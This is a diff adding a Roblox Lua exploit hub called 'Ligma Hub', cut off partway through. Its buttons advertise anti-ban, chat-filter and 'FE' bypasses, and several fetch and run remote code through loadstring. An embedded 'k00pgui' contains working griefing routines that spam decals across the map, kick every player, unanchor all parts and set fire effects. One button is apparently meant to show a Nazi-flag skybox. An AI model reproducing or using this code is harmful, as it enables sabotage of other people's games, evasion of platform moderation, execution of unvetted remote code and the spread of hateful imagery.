@@ -1,0 +1,1500 @@
+--credits to all the script makers
+
+local LigmaHub = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local logo = Instance.new("ImageLabel")
+local title = Instance.new("TextLabel")
+local jointservice = Instance.new("TextButton")
+local _4nn1 = Instance.new("TextButton")
+local k00pgui = Instance.new("TextButton")
+local c00lgui = Instance.new("TextButton")
+local cbypass = Instance.new("TextButton")
+local antiban = Instance.new("TextButton")
+local rektedstudio = Instance.new("TextButton")
+local harked = Instance.new("TextButton")
+local oofhub = Instance.new("TextButton")
+local fates = Instance.new("TextButton")
+local exit = Instance.new("TextButton")
+
+--Properties:
+
+LigmaHub.Name = "Ligma Hub"
+LigmaHub.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+LigmaHub.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+LigmaHub.ResetOnSpawn = false
+
+main.Name = "main"
+main.Parent = LigmaHub
+main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+main.Position = UDim2.new(0.20962888, 0, 0.194520548, 0)
+main.Size = UDim2.new(0, 633, 0, 358)
+
+logo.Name = "logo"
+logo.Parent = main
+logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+logo.BorderSizePixel = 0
+logo.Position = UDim2.new(0, 3, 0.00600000005, 0)
+logo.Size = UDim2.new(0, 32, 0, 33)
+logo.Image = "rbxassetid://87162794"
+
+title.Name = "title"
+title.Parent = main
+title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundTransparency = 1.000
+title.BorderSizePixel = 0
+title.Position = UDim2.new(0.112164296, 0, 0.0227597617, 0)
+title.Size = UDim2.new(0, 23, 0, 21)
+title.Font = Enum.Font.SourceSans
+title.Text = "Ligma Hub"
+title.TextColor3 = Color3.fromRGB(0, 0, 0)
+title.TextSize = 20.000
+
+jointservice.Name = "jointservice"
+jointservice.Parent = main
+jointservice.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+jointservice.Position = UDim2.new(0.0189573448, 0, 0.120111741, 0)
+jointservice.Size = UDim2.new(0, 223, 0, 50)
+jointservice.Font = Enum.Font.SourceSans
+jointservice.Text = "JointService Bypass"
+jointservice.TextColor3 = Color3.fromRGB(0, 0, 0)
+jointservice.TextSize = 26.000
+
+_4nn1.Name = "4nn1"
+_4nn1.Parent = main
+_4nn1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_4nn1.Position = UDim2.new(0.0205371249, 0, 0.284916192, 0)
+_4nn1.Size = UDim2.new(0, 223, 0, 50)
+_4nn1.Font = Enum.Font.SourceSans
+_4nn1.Text = "4nn1 gui"
+_4nn1.TextColor3 = Color3.fromRGB(0, 0, 0)
+_4nn1.TextSize = 26.000
+
+k00pgui.Name = "k00pgui"
+k00pgui.Parent = main
+k00pgui.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+k00pgui.Position = UDim2.new(0.0189573448, 0, 0.455307275, 0)
+k00pgui.Size = UDim2.new(0, 223, 0, 50)
+k00pgui.Font = Enum.Font.SourceSans
+k00pgui.Text = "k00pgui"
+k00pgui.TextColor3 = Color3.fromRGB(0, 0, 0)
+k00pgui.TextSize = 26.000
+
+c00lgui.Name = "c00lgui"
+c00lgui.Parent = main
+c00lgui.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+c00lgui.Position = UDim2.new(0.0189573448, 0, 0.62849158, 0)
+c00lgui.Size = UDim2.new(0, 223, 0, 50)
+c00lgui.Font = Enum.Font.SourceSans
+c00lgui.Text = "c00lgui Modded"
+c00lgui.TextColor3 = Color3.fromRGB(0, 0, 0)
+c00lgui.TextSize = 26.000
+
+cbypass.Name = "cbypass"
+cbypass.Parent = main
+cbypass.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+cbypass.Position = UDim2.new(0.0205371249, 0, 0.798882663, 0)
+cbypass.Size = UDim2.new(0, 223, 0, 50)
+cbypass.Font = Enum.Font.SourceSans
+cbypass.Text = "Chat Bypass"
+cbypass.TextColor3 = Color3.fromRGB(0, 0, 0)
+cbypass.TextSize = 26.000
+
+antiban.Name = "antiban"
+antiban.Parent = main
+antiban.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+antiban.Position = UDim2.new(0.410742491, 0, 0.120111734, 0)
+antiban.Size = UDim2.new(0, 223, 0, 50)
+antiban.Font = Enum.Font.SourceSans
+antiban.Text = "Anti-Ban"
+antiban.TextColor3 = Color3.fromRGB(0, 0, 0)
+antiban.TextSize = 26.000
+
+rektedstudio.Name = "rektedstudio"
+rektedstudio.Parent = main
+rektedstudio.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+rektedstudio.Position = UDim2.new(0.410742491, 0, 0.284916192, 0)
+rektedstudio.Size = UDim2.new(0, 223, 0, 50)
+rektedstudio.Font = Enum.Font.SourceSans
+rektedstudio.Text = "rektedstudio loader"
+rektedstudio.TextColor3 = Color3.fromRGB(0, 0, 0)
+rektedstudio.TextSize = 26.000
+
+harked.Name = "harked"
+harked.Parent = main
+harked.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+harked.Position = UDim2.new(0.410742491, 0, 0.455307275, 0)
+harked.Size = UDim2.new(0, 223, 0, 50)
+harked.Font = Enum.Font.SourceSans
+harked.Text = "Harked Reborn"
+harked.TextColor3 = Color3.fromRGB(0, 0, 0)
+harked.TextSize = 26.000
+
+oofhub.Name = "oofhub"
+oofhub.Parent = main
+oofhub.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+oofhub.Position = UDim2.new(0.410742491, 0, 0.62849164, 0)
+oofhub.Size = UDim2.new(0, 223, 0, 50)
+oofhub.Font = Enum.Font.SourceSans
+oofhub.Text = "KAH Oofhub v2"
+oofhub.TextColor3 = Color3.fromRGB(0, 0, 0)
+oofhub.TextSize = 26.000
+
+fates.Name = "fates"
+fates.Parent = main
+fates.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+fates.Position = UDim2.new(0.410742491, 0, 0.798882663, 0)
+fates.Size = UDim2.new(0, 223, 0, 50)
+fates.Font = Enum.Font.SourceSans
+fates.Text = "Fates Admin"
+fates.TextColor3 = Color3.fromRGB(0, 0, 0)
+fates.TextSize = 26.000
+
+exit.Name = "exit"
+exit.Parent = main
+exit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+exit.BackgroundTransparency = 1.000
+exit.Position = UDim2.new(0.936808825, 0, 0.00558659201, 0)
+exit.Size = UDim2.new(0, 40, 0, 27)
+exit.Font = Enum.Font.SourceSans
+exit.Text = "x"
+exit.TextColor3 = Color3.fromRGB(0, 0, 0)
+exit.TextSize = 30.000
+
+-- Scripts:
+
+local function URQS_fake_script() -- main.Dragify 
+	local script = Instance.new('LocalScript', main)
+
+	local UserInputService = game:GetService("UserInputService")
+	
+	local gui = script.Parent
+	
+	local dragging
+	local dragInput
+	local dragStart
+	local startPos
+	
+	local function update(input)
+		local delta = input.Position - dragStart
+		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+	
+	gui.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = gui.Position
+	
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	
+	gui.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+	
+	UserInputService.InputChanged:Connect(function(input)
+		if input == dragInput and dragging then
+			update(input)
+		end
+	end)
+end
+coroutine.wrap(URQS_fake_script)()
+local function GBRW_fake_script() -- jointservice.function 
+	local script = Instance.new('LocalScript', jointservice)
+
+	function click()
+	loadstring(game:GetObjects("rbxassetid://11032176932")[1].Source)()	
+	end
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(GBRW_fake_script)()
+local function CAXVM_fake_script() -- _4nn1.function 
+	local script = Instance.new('LocalScript', _4nn1)
+
+	function click()
+	loadstring(game:GetObjects("rbxassetid://11032176932")[1].Source)()	
+	end
+	script.Parent.MouseButton1Down:connect(click)
+end
+coroutine.wrap(CAXVM_fake_script)()
+local function POJGGLL_fake_script() -- k00pgui.function 
+	local script = Instance.new('LocalScript', k00pgui)
+
+	function click()
+	--REAL FE BYPASS K00PGUI
+	--REAL HACKS
+	--MADE BY REAL K00PKIDD
+		
+		local k00pgui = Instance.new("ScreenGui")
+		local ScrollingFrame = Instance.new("ScrollingFrame")
+		local Title = Instance.new("TextLabel")
+		local Title_2 = Instance.new("TextLabel")
+		local Title_3 = Instance.new("TextLabel")
+		local Title_4 = Instance.new("TextLabel")
+		local Title_5 = Instance.new("TextLabel")
+		local Decalspam1 = Instance.new("TextButton")
+		local Musicplay = Instance.new("TextButton")
+		local hint = Instance.new("TextButton")
+		local _666 = Instance.new("TextButton")
+		local Unanchor = Instance.new("TextButton")
+		local Shutdown = Instance.new("TextButton")
+		local disco = Instance.new("TextButton")
+		local Particles = Instance.new("TextButton")
+		local jumpscare = Instance.new("TextButton")
+		local stopmusic = Instance.new("TextButton")
+		local destroy = Instance.new("TextButton")
+		local ss1 = Instance.new("TextButton")
+		local ss2 = Instance.new("TextButton")
+		local ss3 = Instance.new("TextButton")
+		local nazi = Instance.new("TextButton")
+	
+		--Properties:
+	
+		k00pgui.Name = "k00pgui"
+		k00pgui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+	
+		ScrollingFrame.Parent = k00pgui
+		ScrollingFrame.Active = true
+		ScrollingFrame.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
+		ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 89, 29)
+		ScrollingFrame.BorderSizePixel = 3
+		ScrollingFrame.Position = UDim2.new(0.0700218678, 0, 0.49818182, 0)
+		ScrollingFrame.Size = UDim2.new(0, 581, 0, 381)
+	
+		Title.Name = "Title"
+		Title.Parent = ScrollingFrame
+		Title.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+		Title.BorderColor3 = Color3.fromRGB(12, 53, 6)
+		Title.BorderSizePixel = 0
+		Title.Position = UDim2.new(0.0859276503, 0, 0.00530304015, 0)
+		Title.Size = UDim2.new(0, 480, 0, 50)
+		Title.Font = Enum.Font.SourceSans
+		Title.Text = "k00pgui 2v"
+		Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Title.TextScaled = true
+		Title.TextSize = 40.000
+		Title.TextWrapped = true
+	
+		Title_2.Name = "Title"
+		Title_2.Parent = Title
+		Title_2.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+		Title_2.BorderColor3 = Color3.fromRGB(12, 53, 6)
+		Title_2.BorderSizePixel = 0
+		Title_2.Position = UDim2.new(0.129268095, 0, 0.991363645, 0)
+		Title_2.Size = UDim2.new(0, 380, 0, 14)
+		Title_2.Font = Enum.Font.SourceSans
+		Title_2.Text = "Inspired by BYTEGUI (made by team k00pkidd)"
+		Title_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Title_2.TextScaled = true
+		Title_2.TextSize = 40.000
+		Title_2.TextWrapped = true
+	
+		Title_3.Name = "Title"
+		Title_3.Parent = Title_2
+		Title_3.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+		Title_3.BorderColor3 = Color3.fromRGB(12, 53, 6)
+		Title_3.BorderSizePixel = 0
+		Title_3.Position = UDim2.new(0.0976891741, 0, 11.348506, 0)
+		Title_3.Size = UDim2.new(0, 257, 0, 17)
+		Title_3.Font = Enum.Font.SourceSans
+		Title_3.Text = "Extra"
+		Title_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Title_3.TextScaled = true
+		Title_3.TextSize = 40.000
+		Title_3.TextWrapped = true
+	
+		Title_4.Name = "Title"
+		Title_4.Parent = Title_3
+		Title_4.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+		Title_4.BorderColor3 = Color3.fromRGB(12, 53, 6)
+		Title_4.BorderSizePixel = 0
+		Title_4.Position = UDim2.new(-0.00347813871, 0, 9.17203426, 0)
+		Title_4.Size = UDim2.new(0, 257, 0, 17)
+		Title_4.Font = Enum.Font.SourceSans
+		Title_4.Text = "SS Scripts"
+		Title_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Title_4.TextScaled = true
+		Title_4.TextSize = 40.000
+		Title_4.TextWrapped = true
+	
+		Title_5.Name = "Title"
+		Title_5.Parent = Title_4
+		Title_5.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+		Title_5.BorderColor3 = Color3.fromRGB(12, 53, 6)
+		Title_5.BorderSizePixel = 0
+		Title_5.Position = UDim2.new(0.00819501281, 0, 4.99556398, 0)
+		Title_5.Size = UDim2.new(0, 257, 0, 17)
+		Title_5.Font = Enum.Font.SourceSans
+		Title_5.Text = "Epok tr0lls!111"
+		Title_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Title_5.TextScaled = true
+		Title_5.TextSize = 40.000
+		Title_5.TextWrapped = true
+	
+		Decalspam1.Name = "Decalspam1"
+		Decalspam1.Parent = Title
+		Decalspam1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		Decalspam1.BorderColor3 = Color3.fromRGB(5, 54, 0)
+		Decalspam1.BorderSizePixel = 2
+		Decalspam1.Position = UDim2.new(-0.0170997158, 0, 1.4345454, 0)
+		Decalspam1.Size = UDim2.new(0, 147, 0, 47)
+		Decalspam1.Font = Enum.Font.SourceSans
+		Decalspam1.Text = "Decal Spam 1"
+		Decalspam1.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Decalspam1.TextScaled = true
+		Decalspam1.TextSize = 14.000
+		Decalspam1.TextWrapped = true
+	
+		Musicplay.Name = "Musicplay"
+		Musicplay.Parent = Title
+		Musicplay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		Musicplay.BorderColor3 = Color3.fromRGB(5, 54, 0)
+		Musicplay.BorderSizePixel = 2
+		Musicplay.Position = UDim2.new(0.32456696, 0, 1.4345454, 0)
+		Musicplay.Size = UDim2.new(0, 147, 0, 47)
+		Musicplay.Font = Enum.Font.SourceSans
+		Musicplay.Text = "Music Play"
+		Musicplay.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Musicplay.TextScaled = true
+		Musicplay.TextSize = 14.000
+		Musicplay.TextWrapped = true
+	
+		hint.Name = "hint"
+		hint.Parent = Title
+		hint.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		hint.BorderColor3 = Color3.fromRGB(5, 54, 0)
+		hint.BorderSizePixel = 2
+		hint.Position = UDim2.new(0.66831696, 0, 1.4345454, 0)
+		hint.Size = UDim2.new(0, 147, 0, 47)
+		hint.Font = Enum.Font.SourceSans
+		hint.Text = "Hint"
+		hint.TextColor3 = Color3.fromRGB(255, 255, 255)
+		hint.TextScaled = true
+		hint.TextSize = 14.000
+		hint.TextWrapped = true
+	
+		_666.Name = "666"
+		_666.Parent = Title
+		_666.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		_666.BorderColor3 = Color3.fromRGB(5, 54, 0)
+		_666.BorderSizePixel = 2
+		_666.Position = UDim2.new(-0.017099686, 0, 2.97454548, 0)
+		_666.Size = UDim2.new(0, 147, 0, 47)
+		_666.Font = Enum.Font.SourceSans
+		_666.Text = "666"
+		_666.TextColor3 = Color3.fromRGB(255, 255, 255)
+		_666.TextScaled = true
+		_666.TextSize = 14.000
+		_666.TextWrapped = true
+	
+		Unanchor.Name = "Unanchor"
+		Unanchor.Parent = Title
+		Unanchor.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		Unanchor.BorderColor3 = Color3.fromRGB(5, 54, 0)
+		Unanchor.BorderSizePixel = 2
+		Unanchor.Position = UDim2.new(0.322483659, 0, 2.97454548, 0)
+		Unanchor.Size = UDim2.new(0, 147, 0, 47)
+		Unanchor.Font = Enum.Font.SourceSans
+		Unanchor.Text = "UnAnchor Parts"
+		Unanchor.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Unanchor.TextScaled = true
+		Unanchor.TextSize = 14.000
+		Unanchor.TextWrapped = true
+	
+		Shutdown.Name = "Shutdown"
+		Shutdown.Parent = Title
+		Shutdown.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		Shutdown.BorderColor3 = Color3.fromRGB(5, 54, 0)
+		Shutdown.BorderSizePixel = 2
+		Shutdown.Position = UDim2.new(0.66831696, 0, 2.97454548, 0)
+		Shutdown.Size = UDim2.new(0, 147, 0, 47)
+		Shutdown.Font = Enum.Font.SourceSans
+		Shutdown.Text = "Shutdown"
+		Shutdown.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Shutdown.TextScaled = true
+		Shutdown.TextSize = 14.000
+		Shutdown.TextWrapped = true
+	
+		disco.Name = "disco"
+		disco.Parent = Title
+		disco.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		disco.BorderColor3 = Color3.fromRGB(5, 54, 0)
+		disco.BorderSizePixel = 2
+		disco.Position = UDim2.new(-0.0170996785, 0, 4.79454565, 0)
+		disco.Size = UDim2.new(0, 147, 0, 47)
+		disco.Font = Enum.Font.SourceSans
+		disco.Text = "Disco"
+		disco.TextColor3 = Color3.fromRGB(255, 255, 255)
+		disco.TextScaled = true
+		disco.TextSize = 14.000
+		disco.TextWrapped = true
+	
+		Particles.Name = "Particles"
+		Particles.Parent = Title
+		Particles.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		Particles.BorderColor3 = Color3.fromRGB(5, 54, 0)
+		Particles.BorderSizePixel = 2
+		Particles.Position = UDim2.new(0.326650321, 0, 4.79454565, 0)
+		Particles.Size = UDim2.new(0, 147, 0, 47)
+		Particles.Font = Enum.Font.SourceSans
+		Particles.Text = "Particles"
+		Particles.TextColor3 = Color3.fromRGB(255, 255, 255)
+		Particles.TextScaled = true
+		Particles.TextSize = 14.000
+		Particles.TextWrapped = true
+	
+		jumpscare.Name = "jumpscare"
+		jumpscare.Parent = Title
+		jumpscare.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		jumpscare.BorderColor3 = Color3.fromRGB(5, 54, 0)
+		jumpscare.BorderSizePixel = 2
+		jumpscare.Position = UDim2.new(0.666233659, 0, 4.79454565, 0)
+		jumpscare.Size = UDim2.new(0, 147, 0, 47)
+		jumpscare.Font = Enum.Font.SourceSans
+		jumpscare.Text = "Jumpscare FE"
+		jumpscare.TextColor3 = Color3.fromRGB(255, 255, 255)
+		jumpscare.TextScaled = true
+		jumpscare.TextSize = 14.000
+		jumpscare.TextWrapped = true
+	
+		stopmusic.Name = "stopmusic"
+		stopmusic.Parent = Title
+		stopmusic.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		stopmusic.BorderColor3 = Color3.fromRGB(5, 54, 0)
+		stopmusic.BorderSizePixel = 2
+		stopmusic.Position = UDim2.new(-0.060849756, 0, -0.00545477867, 0)
+		stopmusic.Size = UDim2.new(0, 91, 0, 20)
+		stopmusic.Font = Enum.Font.SourceSans
+		stopmusic.Text = "Stop Music"
+		stopmusic.TextColor3 = Color3.fromRGB(255, 255, 255)
+		stopmusic.TextScaled = true
+		stopmusic.TextSize = 14.000
+		stopmusic.TextWrapped = true
+	
+		destroy.Name = "destroy"
+		destroy.Parent = Title
+		destroy.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		destroy.BorderColor3 = Color3.fromRGB(5, 54, 0)
+		destroy.BorderSizePixel = 2
+		destroy.Position = UDim2.new(-0.017099699, 0, 6.21454525, 0)
+		destroy.Size = UDim2.new(0, 476, 0, 47)
+		destroy.Font = Enum.Font.SourceSans
+		destroy.Text = "Destroy Complete (ONLY FOR EMERGENCY)"
+		destroy.TextColor3 = Color3.fromRGB(255, 255, 255)
+		destroy.TextScaled = true
+		destroy.TextSize = 14.000
+		destroy.TextWrapped = true
+	
+		ss1.Name = "ss1"
+		ss1.Parent = Title
+		ss1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		ss1.BorderColor3 = Color3.fromRGB(5, 54, 0)
+		ss1.BorderSizePixel = 2
+		ss1.Position = UDim2.new(-0.0170996785, 0, 7.75454617, 0)
+		ss1.Size = UDim2.new(0, 147, 0, 47)
+		ss1.Font = Enum.Font.SourceSans
+		ss1.Text = "c00lgui"
+		ss1.TextColor3 = Color3.fromRGB(255, 255, 255)
+		ss1.TextScaled = true
+		ss1.TextSize = 14.000
+		ss1.TextWrapped = true
+	
+		ss2.Name = "ss2"
+		ss2.Parent = Title
+		ss2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		ss2.BorderColor3 = Color3.fromRGB(5, 54, 0)
+		ss2.BorderSizePixel = 2
+		ss2.Position = UDim2.new(0.326650321, 0, 7.75454617, 0)
+		ss2.Size = UDim2.new(0, 147, 0, 47)
+		ss2.Font = Enum.Font.SourceSans
+		ss2.Text = "game cursor gui"
+		ss2.TextColor3 = Color3.fromRGB(255, 255, 255)
+		ss2.TextScaled = true
+		ss2.TextSize = 14.000
+		ss2.TextWrapped = true
+	
+		ss3.Name = "ss3"
+		ss3.Parent = Title
+		ss3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		ss3.BorderColor3 = Color3.fromRGB(5, 54, 0)
+		ss3.BorderSizePixel = 2
+		ss3.Position = UDim2.new(0.666233659, 0, 7.75454617, 0)
+		ss3.Size = UDim2.new(0, 147, 0, 47)
+		ss3.Font = Enum.Font.SourceSans
+		ss3.Text = "BYTEGUI"
+		ss3.TextColor3 = Color3.fromRGB(255, 255, 255)
+		ss3.TextScaled = true
+		ss3.TextSize = 14.000
+		ss3.TextWrapped = true
+	
+		nazi.Name = "nazi"
+		nazi.Parent = Title
+		nazi.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+		nazi.BorderColor3 = Color3.fromRGB(5, 54, 0)
+		nazi.BorderSizePixel = 2
+		nazi.Position = UDim2.new(-0.019183049, 0, 9.33454514, 0)
+		nazi.Size = UDim2.new(0, 147, 0, 47)
+		nazi.Font = Enum.Font.SourceSans
+		nazi.Text = "Funni German Flag Skybox"
+		nazi.TextColor3 = Color3.fromRGB(255, 255, 255)
+		nazi.TextScaled = true
+		nazi.TextSize = 14.000
+		nazi.TextWrapped = true
+	
+		-- Scripts:
+	
+		local function WWDOHZB_fake_script() -- ScrollingFrame.Drag Gui Script 
+			local script = Instance.new('LocalScript', ScrollingFrame)
+	
+			function dragify(Main)
+				dragToggle = nil
+				dragSpeed = 0.95 -- You can edit this.
+				dragInput = nil
+				dragStart = nil
+				dragPos = nil
+	
+				function updateInput(input)
+					Delta = input.Position - dragStart
+					Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
+					game:GetService("TweenService"):Create(Main, TweenInfo.new(.25), {Position = Position}):Play()
+				end
+	
+				Main.InputBegan:Connect(function(input)
+					if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
+						dragToggle = true
+						dragStart = input.Position
+						startPos = Main.Position
+						input.Changed:Connect(function()
+							if (input.UserInputState == Enum.UserInputState.End) then
+								dragToggle = false
+							end
+						end)
+					end
+				end)
+	
+				Main.InputChanged:Connect(function(input)
+					if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+						dragInput = input
+					end
+				end)
+	
+				game:GetService("UserInputService").InputChanged:Connect(function(input)
+					if (input == dragInput and dragToggle) then
+						updateInput(input)
+					end
+				end)
+			end
+	
+			dragify(script.Parent)
+		end
+		coroutine.wrap(WWDOHZB_fake_script)()
+		local function GFHL_fake_script() -- Decalspam1.Script 
+			local script = Instance.new('Script', Decalspam1)
+	
+			function click()
+				s = Instance.new("Sky")
+				s.Name = "Sky"
+				s.Parent = game.Lighting
+				s.SkyboxBk = "http://www.roblox.com/asset/?id=9422866248"
+				s.SkyboxDn = "http://www.roblox.com/asset/?id=9422866248"
+				s.SkyboxFt = "http://www.roblox.com/asset/?id=9422866248"
+				s.SkyboxLf = "http://www.roblox.com/asset/?id=9422866248"
+				s.SkyboxRt = "http://www.roblox.com/asset/?id=9422866248"
+				s.SkyboxUp = "http://www.roblox.com/asset/?id=9422866248"
+				game.Lighting.TimeOfDay = 12
+			end
+	
+			script.Parent.MouseButton1Down:connect(click)
+		end
+		coroutine.wrap(GFHL_fake_script)()
+		local function HBGN_fake_script() -- Decalspam1.Script 
+			local script = Instance.new('Script', Decalspam1)
+	
+			function click()
+				function exPro(root)
+					for _, v in pairs(root:GetChildren()) do
+						if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id=9422866248" then
+							v.Parent = nil
+						elseif v:IsA("BasePart") then
+							v.Material = "Plastic"
+							v.Transparency = 0
+							local One = Instance.new("Decal", v)
+							local Two = Instance.new("Decal", v)
+							local Three = Instance.new("Decal", v)
+							local Four = Instance.new("Decal", v)
+							local Five = Instance.new("Decal", v)
+							local Six = Instance.new("Decal", v)
+							One.Texture = "http://www.roblox.com/asset/?id=9422866248"
+							Two.Texture = "http://www.roblox.com/asset/?id=9422866248"
+							Three.Texture = "http://www.roblox.com/asset/?id=9422866248"
+							Four.Texture = "http://www.roblox.com/asset/?id=9422866248"
+							Five.Texture = "http://www.roblox.com/asset/?id=9422866248"
+							Six.Texture = "http://www.roblox.com/asset/?id=9422866248"
+							One.Face = "Front"
+							Two.Face = "Back"
+							Three.Face = "Right"
+							Four.Face = "Left"
+							Five.Face = "Top"
+							Six.Face = "Bottom"
+						end
+						exPro(v)
+					end
+				end
+				function asdf(root)
+					for _, v in pairs(root:GetChildren()) do
+						asdf(v)
+					end
+				end
+				exPro(game.Workspace)
+				asdf(game.Workspace)
+			end
+	
+			script.Parent.MouseButton1Down:connect(click)
+		end
+		coroutine.wrap(HBGN_fake_script)()
+		local function SIYRO_fake_script() -- Musicplay.Script 
+			local script = Instance.new('Script', Musicplay)
+	
+			function onClick()
+				Instance.new("Sound").Parent = game.Workspace  game.Workspace.Sound.SoundId ="rbxassetid://7177681888" game.Workspace.Sound.Looped=true  game.Workspace.Sound:Play()
+			end
+	
+			script.Parent.MouseButton1Down:connect(onClick)
+		end
+		coroutine.wrap(SIYRO_fake_script)()
+		local function GYMRHVK_fake_script() -- hint.Script 
+			local script = Instance.new('Script', hint)
+	
+			script.Parent.MouseButton1Click:Connect(function()
+				local m = Instance.new("Hint", game.workspace)
+				m.Text = " This Game Is Doomed By Team k00pkidd & c00lkidd"
+			end)
+		end
+		coroutine.wrap(GYMRHVK_fake_script)()
+		local function ZEXUOID_fake_script() -- _666.Script 
+			local script = Instance.new('Script', _666)
+	
+			script.Parent.MouseButton1Click:Connect(function()
+				for i,v in next,workspace:children''do
+					if(v:IsA'BasePart')then
+						me=v;
+						bbg=Instance.new('BillboardGui',me);
+						bbg.Name='stuf';
+						bbg.Adornee=me;
+						bbg.Size=UDim2.new(2.5,0,2.5,0)
+						--bbg.StudsOffset=Vector3.new(0,2,0)
+						tlb=Instance.new'TextLabel';
+						tlb.Text='666 666 666 666 666 666';
+						tlb.Font='SourceSansBold';
+						tlb.FontSize='Size48';
+						tlb.TextColor3=Color3.new(1,0,0);
+						tlb.Size=UDim2.new(1.25,0,1.25,0);
+						tlb.Position=UDim2.new(-0.125,-22,-1.1,0);
+						tlb.BackgroundTransparency=1;
+						tlb.Parent=bbg;
+					end;end;
+				function xds(dd)
+					for i,v in next,dd:children''do
+						if(v:IsA'BasePart')then
+							v.BrickColor=BrickColor.new'Really black';
+							v.TopSurface='Smooth';
+							v.BottomSurface='Smooth';
+							s=Instance.new('SelectionBox',v);
+							s.Adornee=v;
+							s.Color=BrickColor.new'Really red';
+							a=Instance.new('PointLight',v);
+							a.Color=Color3.new(1,0,0);
+							a.Range=15;
+							a.Brightness=5;
+							f=Instance.new('Fire',v);
+							f.Size=19;
+							f.Heat=22;
+						end;
+	
+						local dec = 'http://www.roblox.com/asset/?id=19399245';
+						local fac = {'Front', 'Back', 'Left', 'Right', 'Top', 'Bottom'}
+						--coroutine.wrap(function()
+						--for ,_ in pairs(fac) do
+						--local ddec = Instance.new("Decal", v)
+						--ddec.Face = 
+						--ddec.Texture = dec
+						--end end)()
+						if #(v:GetChildren())>0 then
+							xds(v) 
+						end
+					end
+				end
+				xds(game.Workspace)
+			end)
+	
+		end
+		coroutine.wrap(ZEXUOID_fake_script)()
+		local function IAQBNCP_fake_script() -- Unanchor.Script 
+			local script = Instance.new('Script', Unanchor)
+	
+			script.Parent.MouseButton1Down:Connect(function()
+				for i,v in pairs(game.Workspace:GetDescendants()) do
+					if v:IsA("BasePart") then	
+						v.Anchored = false
+					end
+				end
+	
+	
+				for i,v in pairs(game.ReplicatedStorage:GetDescendants()) do
+					if v:IsA("BasePart") then
+						v.Anchored = false
+					end
+				end
+	
+	
+				for i,v in pairs(game.ReplicatedFirst:GetDescendants()) do
+					if v:IsA("BasePart") then
+						v.Anchored = false
+					end
+				end
+			end)
+		end
+		coroutine.wrap(IAQBNCP_fake_script)()
+		local function DSNSGXW_fake_script() -- Shutdown.Script 
+			local script = Instance.new('Script', Shutdown)
+	
+			script.Parent.MouseButton1Down:connect(function()
+				for i, players in pairs(game.Players:GetChildren()) do
+					players:Kick("Teh Game Iz Fuked Up!!!!111")
+				end
+			end)
+	
+		end
+		coroutine.wrap(DSNSGXW_fake_script)()
+		local function KPETQT_fake_script() -- disco.Script 
+			local script = Instance.new('Script', disco)
+	
+			script.Parent.MouseButton1Click:Connect(function()
+				local Lighting = game:GetService("Lighting")
+				local ColorCorrection = Instance.new("ColorCorrectionEffect", Lighting)
+	
+				function zigzag(X) 
